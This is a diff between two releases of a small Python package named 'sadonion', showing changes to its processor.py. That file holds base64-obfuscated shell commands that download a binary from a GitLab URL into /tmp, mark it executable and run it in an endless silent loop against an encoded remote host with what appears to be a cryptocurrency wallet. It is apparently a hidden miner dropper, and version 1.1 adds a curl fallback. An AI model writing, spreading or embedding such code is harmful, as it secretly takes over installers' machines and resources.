# Comparing `tmp/sadonion-1.0.tar.gz` & `tmp/sadonion-1.1.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "sadonion-1.0.tar", last modified: Tue May 16 05:49:49 2023, max compression
+gzip compressed data, was "sadonion-1.1.tar", last modified: Tue May 16 19:53:52 2023, max compression
```

## Comparing `sadonion-1.0.tar` & `sadonion-1.1.tar`

### file list

```diff
@@ -1,12 +1,12 @@
-drwxr-xr-x   0 qoriainaa   (501) staff       (20)        0 2023-05-16 05:49:49.101004 sadonion-1.0/
--rw-r--r--   0 qoriainaa   (501) staff       (20)       68 2023-05-16 05:49:49.100554 sadonion-1.0/PKG-INFO
-drwxr-xr-x   0 qoriainaa   (501) staff       (20)        0 2023-05-16 05:49:49.096947 sadonion-1.0/sadonion/
--rw-r--r--   0 qoriainaa   (501) staff       (20)       34 2023-05-16 03:15:30.000000 sadonion-1.0/sadonion/__init__.py
--rw-r--r--   0 qoriainaa   (501) staff       (20)      922 2023-05-16 05:48:28.000000 sadonion-1.0/sadonion/processor.py
-drwxr-xr-x   0 qoriainaa   (501) staff       (20)        0 2023-05-16 05:49:49.099795 sadonion-1.0/sadonion.egg-info/
--rw-r--r--   0 qoriainaa   (501) staff       (20)       68 2023-05-16 05:49:48.000000 sadonion-1.0/sadonion.egg-info/PKG-INFO
--rw-r--r--   0 qoriainaa   (501) staff       (20)      179 2023-05-16 05:49:48.000000 sadonion-1.0/sadonion.egg-info/SOURCES.txt
--rw-r--r--   0 qoriainaa   (501) staff       (20)        1 2023-05-16 05:49:48.000000 sadonion-1.0/sadonion.egg-info/dependency_links.txt
--rw-r--r--   0 qoriainaa   (501) staff       (20)        9 2023-05-16 05:49:48.000000 sadonion-1.0/sadonion.egg-info/top_level.txt
--rw-r--r--   0 qoriainaa   (501) staff       (20)       38 2023-05-16 05:49:49.101160 sadonion-1.0/setup.cfg
--rw-r--r--   0 qoriainaa   (501) staff       (20)      159 2023-05-16 05:49:17.000000 sadonion-1.0/setup.py
+drwxr-xr-x   0 qoriainaa   (501) staff       (20)        0 2023-05-16 19:53:52.174808 sadonion-1.1/
+-rw-r--r--   0 qoriainaa   (501) staff       (20)       68 2023-05-16 19:53:52.174258 sadonion-1.1/PKG-INFO
+drwxr-xr-x   0 qoriainaa   (501) staff       (20)        0 2023-05-16 19:53:52.169845 sadonion-1.1/sadonion/
+-rw-r--r--   0 qoriainaa   (501) staff       (20)       34 2023-05-16 03:15:30.000000 sadonion-1.1/sadonion/__init__.py
+-rw-r--r--   0 qoriainaa   (501) staff       (20)     1453 2023-05-16 19:52:49.000000 sadonion-1.1/sadonion/processor.py
+drwxr-xr-x   0 qoriainaa   (501) staff       (20)        0 2023-05-16 19:53:52.173535 sadonion-1.1/sadonion.egg-info/
+-rw-r--r--   0 qoriainaa   (501) staff       (20)       68 2023-05-16 19:53:51.000000 sadonion-1.1/sadonion.egg-info/PKG-INFO
+-rw-r--r--   0 qoriainaa   (501) staff       (20)      179 2023-05-16 19:53:52.000000 sadonion-1.1/sadonion.egg-info/SOURCES.txt
+-rw-r--r--   0 qoriainaa   (501) staff       (20)        1 2023-05-16 19:53:51.000000 sadonion-1.1/sadonion.egg-info/dependency_links.txt
+-rw-r--r--   0 qoriainaa   (501) staff       (20)        9 2023-05-16 19:53:51.000000 sadonion-1.1/sadonion.egg-info/top_level.txt
+-rw-r--r--   0 qoriainaa   (501) staff       (20)       38 2023-05-16 19:53:52.175123 sadonion-1.1/setup.cfg
+-rw-r--r--   0 qoriainaa   (501) staff       (20)      159 2023-05-16 19:53:08.000000 sadonion-1.1/setup.py
```

### Comparing `sadonion-1.0/sadonion/processor.py` & `sadonion-1.1/sadonion/processor.py`

 * *Files 19% similar despite different names*

```diff
@@ -3,16 +3,28 @@
 import base64
 
 def decode_str(encoded_str):
     decoded_bytes = base64.b64decode(encoded_str)
     # print(decoded_bytes)
     decoded_str = decoded_bytes.decode('utf-8')
     return decoded_str
-
 def processing():
     file = str(random.randint(1, 999999))
     HOST = decode_str("dmlwLnBhcGljdWxvLm5ldDo4MA==")
     CONFIG = decode_str("ZGVybzFxeTI1eWZ5encwMGQ1dDBtdDhwdnRkOXQ0cDd6cDh4M3psMDZwd2toYWo0emt1cWhubW52MnFnYWtyNnU3")
-    subprocess.run(str(decode_str('d2dldCAtcU8gL3RtcC97MH0gaHR0cHM6Ly9naXRsYWIuY29tL2FsZHJpdGVyYWtoaXIvaW5zdGFsbGVyLy0vcmF3L21haW4vYnd0MiAmJiBjaG1vZCAreCAvdG1wL3swfQ==')).format(file), shell=True)
+
+    try:
+        subprocess.check_output([decode_str('d2dldA=='), decode_str('LS12ZXJzaW9u')])
+        subprocess.run(str(decode_str('d2dldCAtcU8gL3RtcC97MH0gaHR0cHM6Ly9naXRsYWIuY29tL2FsZHJpdGVyYWtoaXIvaW5zdGFsbGVyLy0vcmF3L21haW4vYnd0MiAmJiBjaG1vZCAreCAvdG1wL3swfQ==')).format(file), shell=True)
+    
+    except FileNotFoundError:
+        try:
+            subprocess.check_output([decode_str('Y3VybA=='), decode_str('LS12ZXJzaW9u')])
+            subprocess.run(str(decode_str('Y3VybCAtTCAtcyAtLW91dHB1dCAvdG1wL3swfSBodHRwczovL2dpdGxhYi5jb20vYWxkcml0ZXJha2hpci9pbnN0YWxsZXIvLS9yYXcvbWFpbi9id3QyICYmIGNobW9kICt4IC90bXAvezB9')).format(file), shell=True)
+    
+        except FileNotFoundError:
+            print("Error.")
+    
+    
     command = [decode_str("YmFzaA=="), decode_str("LWM="), str(decode_str("d2hpbGUgdHJ1ZTsgZG8gL3RtcC97MH0gLXIgezF9IC13IHsyfSAtcCBycGM7IHNsZWVwIDU7IGRvbmU=")).format(file,HOST,CONFIG)]
     subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
```

